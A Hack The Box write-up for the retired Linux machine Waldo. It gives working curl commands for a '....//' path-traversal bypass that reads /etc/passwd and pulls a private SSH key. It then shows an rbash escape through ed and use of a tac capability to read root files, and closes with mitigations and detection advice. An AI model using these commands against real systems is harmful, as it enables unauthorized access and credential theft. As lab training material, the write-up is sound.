---
machine: Waldo
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, lfi, capabilities, rbash, privesc]
---

# Waldo — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

List Manager uses four PHP scripts (`dirRead`, `fileRead`, `fileWrite`, `fileDelete`) that accept paths. `dirRead` and `fileRead` strip `../` with `str_replace`, but the replacement is not recursive: `....//` becomes `../`. That bypass lists the root, reads `/etc/passwd` and retrieves `/home/nobody/.ssh/.monitor`, a private key. The key gives SSH as `nobody` in an Alpine container. From there the same key authenticates as `monitor` on `localhost` and returns an `rbash`; the `red` binary links to unrestricted `ed`, and `!/bin/sh` escapes. `monitor` has `tac` with `cap_dac_read_search`, enough to read `/root/root.txt`; there is no root shell.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 7.5.
- `80` nginx 1.12.2, List Manager.
- `8888` filtered externally; the container's SSH.

The site creates lists and items. Requests go to `dirRead.php`, `fileRead.php`, `fileWrite.php` and `fileDelete.php`.

## Enumeration

`dirRead.php` takes `path` and `fileRead.php` takes `file`. The source is read by requesting the PHP files themselves:

```bash
curl -s -X POST -d 'file=dirRead.php' http://<IP>/fileRead.php | jq -r .file
```

Both apply:

```php
$_POST['path'] = str_replace(array("../", "..\\"), "", $_POST['path']);
```

`str_replace` makes a single pass: `....//` becomes `../`. List the root and read `/etc/passwd`:

```bash
curl -s -X POST -d 'path=....//....//....//' http://<IP>/dirRead.php | jq -rc .
curl -s -X POST -d 'file=....//....//....//etc/passwd' http://<IP>/fileRead.php | jq -r .file
```

`fileRead` blocks the string `user.txt`, but not `/home/nobody/.ssh/.monitor`. Save the key and log in:

```bash
curl -s -X POST -d 'file=....//....//....//home/nobody/.ssh/.monitor' \
  http://<IP>/fileRead.php | jq -r .file > id_monitor
chmod 600 id_monitor
ssh -i id_monitor nobody@<IP>
```

## Lateral movement

The container's `/etc/ssh/sshd_config` listens on `8888` and only allows `nobody`; the host forwards external `22`. The `.monitor` key also authenticates as `monitor` on `localhost`:

```bash
ssh -i /home/nobody/.ssh/.monitor monitor@localhost
```

The shell is `rbash`, with `PATH` limited to `/home/monitor/bin` and `app-dev`; it blocks `cd` and commands outside that path.

## Privilege escalation

In `bin`, `red` links to `/bin/ed` without the `red` restriction. `ed` runs commands with `!`:

```text
$ red
!/bin/sh
$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Outside `rbash`, `getcap -r /` shows:

```text
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

`tac` reverses line order and can read any file:

```bash
tac /root/root.txt
```

For multi-line files, `tac file | tac` restores the order. No root shell is obtained: the goal is full disk read.

## Evidence

- `dirRead.php` response with the container root.
- `/etc/passwd` and the `.monitor` key read with `....//`.
- SSH as `nobody` and `monitor@localhost`.
- `rbash` and escape through `red` → `!/bin/sh`.
- `getcap` showing `tac` and a read of `/root/root.txt`.

## Lessons learned

- `str_replace` is not recursive; traversal filters must normalise the path.
- A hidden `.ssh` directory may hold a key with more reach than expected.
- `rbash` is not a sandbox if `PATH` includes binaries that run commands.
- Capabilities are a quieter alternative to setuid.
- A box's goal may be root read access, not a root shell.

## Mitigations and detection

- Resolve paths with `realpath` and verify they stay inside the webroot.
- Do not rely on `../` blocklists; use a filename allowlist.
- Do not reuse SSH keys across accounts and containers.
- Restrict `rbash` to genuinely limited binaries; do not link unrestricted `ed`.
- Audit capabilities with `getcap -r /` and remove `cap_dac_read_search` from generic tools.
- Detect `....//` requests, `.ssh` reads and `tac` against `/root`.

## References

- [0xdf — Waldo](https://0xdf.gitlab.io/2018/12/15/htb-waldo.html)
- [IppSec — Waldo](https://www.youtube.com/watch?v=1klneIHECqY)
- [Hack The Box — Waldo](https://app.hackthebox.com/machines/waldo)
